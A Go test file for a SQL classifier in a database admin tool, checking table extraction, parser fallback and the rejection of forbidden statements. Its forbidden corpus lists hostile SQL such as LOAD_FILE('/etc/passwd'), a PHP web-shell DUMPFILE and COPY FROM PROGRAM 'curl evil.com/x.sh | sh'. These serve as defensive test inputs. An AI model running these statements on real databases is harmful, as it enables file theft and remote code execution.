package classifier_test

import (
	"strings"
	"testing"

	"github.com/auracp/auracp/pkg/dbadmin"
	"github.com/auracp/auracp/pkg/dbadmin/classifier"
)

// ─── AST classifier tests: cases the tokenizer could not handle ──────

func TestAST_MySQL_BasicTablesExtraction(t *testing.T) {
	cases := []struct {
		name       string
		sql        string
		wantTables []string // "schema.object" or "object" when schema empty
	}{
		{
			"plain SELECT",
			"SELECT id, name FROM users",
			[]string{"users"},
		},
		{
			"JOIN",
			"SELECT u.id, o.id FROM users u JOIN orders o ON o.uid=u.id",
			[]string{"users", "orders"},
		},
		{
			"schema-qualified",
			"SELECT * FROM mydb.users",
			[]string{"mydb.users"},
		},
		{
			"UPDATE with subquery",
			"UPDATE users SET x=1 WHERE id IN (SELECT uid FROM bans)",
			[]string{"users", "bans"},
		},
		{
			"INSERT ... SELECT",
			"INSERT INTO logs (ts, msg) SELECT NOW(), msg FROM staging.events",
			[]string{"logs", "staging.events"},
		},
		{
			"CTE — alias is NOT a table; source IS",
			"WITH x AS (SELECT * FROM source) SELECT * FROM x",
			[]string{"source"},
		},
		{
			"multi-statement: empty / populated",
			"SELECT 1; INSERT INTO t VALUES (1); UPDATE u SET x=1 WHERE id=2",
			[]string{"t", "u"}, // SELECT 1 has no tables; t + u recorded
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EngineMariaDB, c.sql)
			if err != nil {
				t.Fatalf("Classify err = %v", err)
			}
			got := flattenTables(pq.Statements)
			if !equalTableSet(got, c.wantTables) {
				t.Errorf("tables = %v, want %v (pq=%+v)", got, c.wantTables, pq)
			}
		})
	}
}

func TestAST_Postgres_BasicTablesExtraction(t *testing.T) {
	cases := []struct {
		name       string
		sql        string
		wantTables []string
	}{
		{
			"JOIN with schema",
			"SELECT * FROM public.users u JOIN public.orders o ON o.uid=u.id",
			[]string{"public.users", "public.orders"},
		},
		{
			"system catalog reference",
			"SELECT * FROM pg_catalog.pg_tables",
			[]string{"pg_catalog.pg_tables"},
		},
		{
			"UPDATE with WHERE — subquery contributes",
			"UPDATE users SET x=1 WHERE id IN (SELECT uid FROM bans)",
			[]string{"users", "bans"},
		},
		{
			"CTE — binding excluded, source included",
			"WITH x AS (SELECT id FROM people WHERE active) SELECT * FROM x",
			[]string{"people"},
		},
		{
			"TRUNCATE multiple",
			"TRUNCATE TABLE evictions, audit",
			[]string{"evictions", "audit"},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EnginePostgres, c.sql)
			if err != nil {
				t.Fatalf("Classify err = %v", err)
			}
			// On nocgo builds the Postgres AST is unavailable; the
			// cascade degrades to tokenizer-only and Tables stays nil.
			if pq.ParseSource == classifier.ParseSourceFallback {
				t.Skipf("Postgres AST disabled in this build (ParseSource=%v)", pq.ParseSource)
			}
			got := flattenTables(pq.Statements)
			if !equalTableSet(got, c.wantTables) {
				t.Errorf("tables = %v, want %v (pq=%+v)", got, c.wantTables, pq)
			}
		})
	}
}

// TestAST_MySQL_HasWhereDerivedFromAST covers the headline win from
// PR #2.5 — the AST tells us exactly whether WHERE exists, no false
// positive from a containsKeyword scan that could pick up "WHERE"
// inside a string literal.
func TestAST_MySQL_HasWhereDerivedFromAST(t *testing.T) {
	cases := []struct {
		sql      string
		wantHas  bool
		wantMass bool
	}{
		{`UPDATE t SET x=1 WHERE id=1`, true, false},
		{`UPDATE t SET msg='WHERE clause not present'`, false, true},
		{`DELETE FROM t WHERE id=1`, true, false},
		{`DELETE FROM t /* WHERE comment */`, false, true},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EngineMariaDB, c.sql)
			if err != nil {
				t.Fatal(err)
			}
			if len(pq.Statements) == 0 {
				t.Fatal("no statements")
			}
			ps := pq.Statements[0]
			if ps.HasWhere != c.wantHas {
				t.Errorf("HasWhere = %v, want %v", ps.HasWhere, c.wantHas)
			}
			isMass := ps.Class == classifier.ClassWriteRowMass
			if isMass != c.wantMass {
				t.Errorf("mass=%v want %v (class=%v)", isMass, c.wantMass, ps.Class)
			}
		})
	}
}

// TestAST_PostgresQuotedLanguageIdentifier exercises the AST-only win
// described in the design: a "plpythonu" quoted identifier in a
// CREATE FUNCTION LANGUAGE clause must be classified as forbidden.
// The PR #2 tokenizer matches IDENT-only (LANGUAGE kwAny plpythonu …)
// and skips TokQuotedIdent; the AST sees the language directly.
func TestAST_PostgresQuotedLanguageIdentifier(t *testing.T) {
	sql := `CREATE FUNCTION attack() RETURNS void AS 'pass' LANGUAGE "plpythonu"`
	pq, err := classifier.Classify(dbadmin.EnginePostgres, sql)
	if err != nil {
		t.Fatal(err)
	}
	if pq.ParseSource == classifier.ParseSourceFallback {
		t.Skipf("Postgres AST disabled in this build")
	}
	if pq.Class != classifier.ClassForbidden {
		t.Errorf("class = %v, want ClassForbidden (forbidden=%v parse=%v)",
			pq.Class, pq.Forbidden, pq.ParseSource)
	}
}

// TestAST_PostgresCopyToPath_TablesRecordedEvenWhenForbidden verifies
// that even when a statement is rejected as forbidden, its Tables[]
// is still populated. Per-table audit needs the touched tables to
// surface in the audit log even for refused statements.
func TestAST_PostgresCopyToPath_TablesRecordedEvenWhenForbidden(t *testing.T) {
	sql := `COPY users TO '/tmp/x'`
	pq, err := classifier.Classify(dbadmin.EnginePostgres, sql)
	if err != nil {
		t.Fatal(err)
	}
	if pq.ParseSource == classifier.ParseSourceFallback {
		t.Skipf("Postgres AST disabled in this build")
	}
	if pq.Class != classifier.ClassForbidden {
		t.Errorf("class = %v, want ClassForbidden", pq.Class)
	}
	if len(pq.Statements) == 0 || len(pq.Statements[0].Tables) == 0 {
		t.Errorf("Tables[] empty for COPY-to-path; audit needs touched table")
	}
}

// ─── Cascade behavior ────────────────────────────────────────────────

// TestCascade_FallbackOnParseError feeds something vitess does not
// support (GRANT) and asserts the cascade falls back to the tokenizer
// without erroring.
func TestCascade_FallbackOnParseError(t *testing.T) {
	sql := `GRANT SELECT ON *.* TO 'alice'@'%'`
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, sql)
	if err != nil {
		t.Fatal(err)
	}
	if pq.Class != classifier.ClassDangerous {
		t.Errorf("class = %v, want ClassDangerous (Forbidden=%v)", pq.Class, pq.Forbidden)
	}
	if pq.ParseSource != classifier.ParseSourceFallback {
		t.Errorf("ParseSource = %v, want Fallback", pq.ParseSource)
	}
	if len(pq.Statements) == 0 || pq.Statements[0].ParseSource != classifier.ParseSourceFallback {
		t.Errorf("statement[0] ParseSource = %v, want Fallback", pq.Statements[0].ParseSource)
	}
}

// TestCascade_PerStatementFallback feeds a multi-statement input where
// statement 1 parses cleanly with the AST and statement 2 is a GRANT
// that vitess refuses. Asserts indices and ParseSource per statement.
func TestCascade_PerStatementFallback(t *testing.T) {
	sql := `SELECT 1; GRANT SELECT ON *.* TO 'alice'@'%'; SELECT 2`
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, sql)
	if err != nil {
		t.Fatal(err)
	}
	if len(pq.Statements) != 3 {
		t.Fatalf("got %d statements, want 3", len(pq.Statements))
	}
	if pq.Statements[0].ParseSource != classifier.ParseSourceAST {
		t.Errorf("stmt[0] ParseSource = %v, want AST", pq.Statements[0].ParseSource)
	}
	if pq.Statements[1].ParseSource != classifier.ParseSourceFallback {
		t.Errorf("stmt[1] ParseSource = %v, want Fallback", pq.Statements[1].ParseSource)
	}
	if pq.Statements[2].ParseSource != classifier.ParseSourceAST {
		t.Errorf("stmt[2] ParseSource = %v, want AST", pq.Statements[2].ParseSource)
	}
	if pq.ParseSource != classifier.ParseSourceMixed {
		t.Errorf("aggregate ParseSource = %v, want Mixed", pq.ParseSource)
	}
	if pq.Statements[1].Class != classifier.ClassDangerous {
		t.Errorf("GRANT class = %v, want ClassDangerous", pq.Statements[1].Class)
	}
}

// TestCascade_ForbiddenAlwaysRuns confirms the no-override guarantee:
// even when the AST parses an input cleanly, the forbidden matcher
// still runs over the raw token stream and can promote the result to
// ClassForbidden.
func TestCascade_ForbiddenAlwaysRuns(t *testing.T) {
	// LOAD_FILE() is a clean expression vitess will happily parse;
	// the forbidden matcher's MySQL pattern triggers regardless.
	sql := `SELECT LOAD_FILE('/etc/passwd')`
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, sql)
	if err != nil {
		t.Fatal(err)
	}
	if pq.Class != classifier.ClassForbidden {
		t.Errorf("class = %v, want ClassForbidden", pq.Class)
	}
	if len(pq.Forbidden) == 0 {
		t.Error("Forbidden empty after raw-token gate")
	}
}

// TestCascade_StatementIndexAlignment asserts that the forbidden
// matcher's StatementIndex is aligned with ParsedQuery.Statements
// even when the input has leading/trailing/internal empty statements.
func TestCascade_StatementIndexAlignment(t *testing.T) {
	sql := `;;SELECT 1;;SELECT LOAD_FILE('/x');;`
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, sql)
	if err != nil {
		t.Fatal(err)
	}
	if len(pq.Statements) != 2 {
		t.Fatalf("got %d statements, want 2 (statements=%+v)", len(pq.Statements), pq.Statements)
	}
	if len(pq.Forbidden) == 0 {
		t.Fatal("no forbidden matches")
	}
	if pq.Forbidden[0].StatementIndex != 1 {
		t.Errorf("Forbidden[0].StatementIndex = %d, want 1", pq.Forbidden[0].StatementIndex)
	}
}

// TestAST_NoDowngradeFromForbidden runs every forbidden-corpus entry
// already exercised by TestClassify_Forbidden_* through the cascade
// and asserts the result is still ClassForbidden. Catches accidental
// classifier downgrades introduced by the AST upgrade.
func TestAST_NoDowngradeFromForbidden(t *testing.T) {
	mysqlCorpus := []string{
		`SELECT LOAD_FILE('/etc/passwd')`,
		`SELECT * FROM users INTO OUTFILE '/tmp/exfil'`,
		`SELECT 'rce' INTO DUMPFILE '/var/www/html/shell.php'`,
		`LOAD DATA INFILE '/etc/hosts' INTO TABLE t`,
		`SELECT sys_exec('id')`,
	}
	for _, sql := range mysqlCorpus {
		t.Run(sql, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EngineMariaDB, sql)
			if err != nil {
				t.Fatal(err)
			}
			if pq.Class != classifier.ClassForbidden {
				t.Errorf("downgrade: class = %v want ClassForbidden", pq.Class)
			}
		})
	}
	pgCorpus := []string{
		`COPY t FROM PROGRAM 'curl evil.com/x.sh | sh'`,
		`COPY t TO '/tmp/exfil.csv'`,
		`SELECT pg_read_file('/etc/passwd', 0, 1000)`,
		`SELECT lo_import('/etc/passwd')`,
		`CREATE FUNCTION attack() RETURNS void AS 'pass' LANGUAGE plpythonu`,
	}
	for _, sql := range pgCorpus {
		t.Run(sql, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EnginePostgres, sql)
			if err != nil {
				t.Fatal(err)
			}
			if pq.Class != classifier.ClassForbidden {
				t.Errorf("downgrade: class = %v want ClassForbidden", pq.Class)
			}
		})
	}
}

// TestAST_ConnectionIDIsEmpty documents the per-PR-design contract:
// classifier never knows the connection ID; callers populate it.
func TestAST_ConnectionIDIsEmpty(t *testing.T) {
	pq, err := classifier.Classify(dbadmin.EngineMariaDB, "SELECT * FROM users")
	if err != nil {
		t.Fatal(err)
	}
	if len(pq.Statements) == 0 || len(pq.Statements[0].Tables) == 0 {
		t.Fatal("expected at least one Target")
	}
	for _, tg := range pq.Statements[0].Tables {
		if tg.ConnectionID != "" {
			t.Errorf("ConnectionID = %q, want empty (classifier never sets it)", tg.ConnectionID)
		}
	}
}

// TestAST_PR2EquivalenceRegression replays a slice of the PR #2 corpus
// and asserts that Class+Kind stay identical under the cascade. Tables
// may now be populated where they were empty before; that is purely
// additive and not asserted here.
func TestAST_PR2EquivalenceRegression(t *testing.T) {
	cases := []struct {
		sql       string
		wantClass classifier.QueryClass
		wantKind  classifier.StatementKind
	}{
		{"SELECT 1", classifier.ClassRead, classifier.KindSelect},
		{"INSERT INTO users VALUES (1)", classifier.ClassWriteRow, classifier.KindInsert},
		{"UPDATE users SET name='x' WHERE id=1", classifier.ClassWriteRow, classifier.KindUpdate},
		{"UPDATE users SET name='x'", classifier.ClassWriteRowMass, classifier.KindUpdate},
		{"DELETE FROM users WHERE id=1", classifier.ClassWriteRow, classifier.KindDelete},
		{"DELETE FROM users", classifier.ClassWriteRowMass, classifier.KindDelete},
		{"TRUNCATE TABLE users", classifier.ClassWriteRowMass, classifier.KindTruncate},
		{"CREATE TABLE users (id INT)", classifier.ClassDDL, classifier.KindCreate},
		{"DROP TABLE users", classifier.ClassDDL, classifier.KindDrop},
		{"COMMIT", classifier.ClassRead, classifier.KindCommit},
		{"BEGIN", classifier.ClassRead, classifier.KindBegin},
		{"START TRANSACTION", classifier.ClassRead, classifier.KindStart},
	}
	for _, c := range cases {
		t.Run(c.sql, func(t *testing.T) {
			pq, err := classifier.Classify(dbadmin.EngineMariaDB, c.sql)
			if err != nil {
				t.Fatal(err)
			}
			if pq.Class != c.wantClass {
				t.Errorf("class = %v want %v", pq.Class, c.wantClass)
			}
			if len(pq.Statements) == 0 || pq.Statements[0].Kind != c.wantKind {
				got := classifier.KindUnknown
				if len(pq.Statements) > 0 {
					got = pq.Statements[0].Kind
				}
				t.Errorf("kind = %v want %v", got, c.wantKind)
			}
		})
	}
}

// ─── Helpers ─────────────────────────────────────────────────────────

func flattenTables(stmts []classifier.ParsedStatement) []string {
	var out []string
	for _, s := range stmts {
		for _, tg := range s.Tables {
			if tg.Schema == "" {
				out = append(out, tg.Object)
			} else {
				out = append(out, tg.Schema+"."+tg.Object)
			}
		}
	}
	return out
}

// equalTableSet compares two slices ignoring order but preserving
// uniqueness. The AST collector dedupes, so duplicates are unexpected.
func equalTableSet(got, want []string) bool {
	if len(got) != len(want) {
		return false
	}
	gm := map[string]int{}
	for _, g := range got {
		gm[g]++
	}
	for _, w := range want {
		if gm[w] == 0 {
			return false
		}
		gm[w]--
	}
	for _, v := range gm {
		if v != 0 {
			return false
		}
	}
	return true
}

// silence unused-import warnings when fully nocgo builds skip some
// helpers — strings is used by flattenTables in some test variants.
var _ = strings.Split
